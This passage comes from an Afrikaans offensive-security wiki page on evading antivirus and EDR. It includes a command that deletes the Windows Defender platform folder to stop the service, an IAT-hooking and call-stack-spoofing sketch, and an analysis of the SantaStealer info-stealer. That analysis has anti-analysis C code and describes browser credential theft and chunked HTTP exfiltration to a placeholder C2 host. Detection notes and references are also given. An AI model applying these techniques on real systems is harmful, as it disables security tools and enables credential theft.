4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die omgeleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe proses-pad onder `C:\TMP\AV\` en die dienskonfigurasie/registry wat daardie ligging weerspieël, te sien.

Post-exploitation options
- DLL sideloading/code execution: Plaas/vervang DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat by die volgende start die geconfigureerde pad nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let wel: hierdie tegniek verskaf nie privilege escalation op sigself nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant verskuif na die teikenmodule self deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker-controlled, position‑independent code (PIC) te stuur. Dit generaliseer evasion buite die klein API‑oppervlak wat baie kits openbaar (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

High-level approach
- Plaas 'n PIC blob langs die teikenmodule deur 'n reflective loader te gebruik (prepended of companion). Die PIC moet self‑contained en position‑independent wees.
- Soos die host DLL laai, loop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT‑inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC‑wrappers wys.
- Elke PIC‑wrapper voer evasions uit voordat dit 'n tail‑call na die werklike API‑adres maak. Tipiese evasions sluit in:
  - Memory mask/unmask rondom die oproep (bv. encrypt beacon regions, RWX→RX, verander bladsyname/toestemmings) en herstel ná die oproep.
  - Call‑stack spoofing: konstrueer 'n onskuldige stack en gaan oor in die teiken‑API sodat call‑stack‑analise na verwagte rame oplos.
- Vir versoenbaarheid, exporteer 'n interface sodat 'n Aggressor script (of ekwivalente) kan registreer watter APIs gehook moet word vir Beacon, BOFs en post‑ex DLLs.

Why IAT hooking here
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool‑kode te wysig of op Beacon te staatmaak om spesifieke APIs te proxy.
- Dek post‑ex DLLs: deur LoadLibrary* te hook kan jy module‑laaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API‑oproepe toepas.
- Herstel betroubare gebruik van process‑spawning post‑ex opdragte teen call‑stack–gebaseerde deteksies deur CreateProcessA/W te omsluit.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe na relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking gedurende DllMain van die loaded module.
- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy voor patching vasgelê het of via LdrGetProcedureAddress.
- Gebruik RW → RX transisies vir PIC en vermy om writable+executable pages agter te laat.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bou 'n vals call chain (return addresses into benign modules) en pivot dan in die werklike API.
- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitive APIs verwag.
- Kombineer met stack cutting/stack stitching techniques om binne die verwagte frames te beland voor die API prologue.

Operasionele integrasie
- Prepend die reflective loader aan post‑ex DLLs sodat die PIC en hooks outomaties initialise wanneer die DLL gelaai word.
- Gebruik 'n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder kode-wysigings.

Opsporing/DFIR oorwegings
- IAT integriteit: inskrywings wat na non‑image (heap/anon) adresse oplos; periodieke verifikasie van import pointers.
- Stack-afwykings: return addresses wat nie by loaded images behoort nie; skielike transisies na non‑image PIC; inkonsekwente RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX regions geskep tydens load.
- Image‑load evasion: indien hooking van LoadLibrary*, monitor verdagte loads van automation/clr assemblies wat met memory masking events gekorreleer is.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT patching tydens load uitvoer (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) en stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft vir Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in 'n enkele workflow meng.

### Keyboard layout gating & sandbox delay

- 'n Config flag (`anti_cis`) enumereer geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Cyrillic layout gevind word, skep die sample 'n leë `CIS` marker en beëindig voor dit die stealers uitvoer, wat verseker dat dit nooit op uitgeslote lokale aktiveer nie terwyl 'n hunting artifact agtergelaat word.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gelaagde `check_antivm` logika

- Variant A loop deur die proseslys, hasj elke naam met 'n maatgemaakte rollende checksum, en vergelyk dit teen ingebedde blokkelyste vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarsnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B inspekteer stelsel-eienskappe (process-count floor, recent uptime), roep `OpenServiceA("VBoxGuest")` om VirtualBox additions te detect, en voer timing checks rondom sleeps uit om single-stepping op te spoor. Enige treffers staak vooraleer modules begin.

### Fileless helper + double ChaCha20 reflective loading

- Die primêre DLL/EXE embed 'n Chromium credential helper wat óf na disk gedrop word óf handmatig in-memory gemapped word; fileless mode los imports/relocations self op sodat geen helper-artefakte geskryf word nie.
- Daardie helper stoor 'n tweede-fase DLL wat twee keer met ChaCha20 geïnkripteer is (two 32-byte keys + 12-byte nonces). Na beide passe laai dit die blob reflectively (no `LoadLibrary`) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in 'n lewende Chromium browser te inject, erf AppBound Encryption keys, en decrypt passwords/cookies/credit cards direk uit SQLite databases ondanks ABE hardening.

### Modulêre in-memory versameling & chunked HTTP exfil

- `create_memory_based_log` iterereer 'n globale `memory_generators` function-pointer tabel en spawn een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Elke thread skryf resultate in gedeelde buffers en rapporteer sy file count na 'n ~45s join window.
- Sodra klaar, word alles gezip met die staties gelinkte `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en stream die argief in 10 MB chunks via HTTP POST na `http://<C2>:6767/upload`, spoofing 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Elke chunk voeg by `User-Agent: upload`, `auth: <build_id>`, opsionele `w: <campaign_tag>`, en die laaste chunk plak `complete: true` sodat die C2 weet reassembly klaar is.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
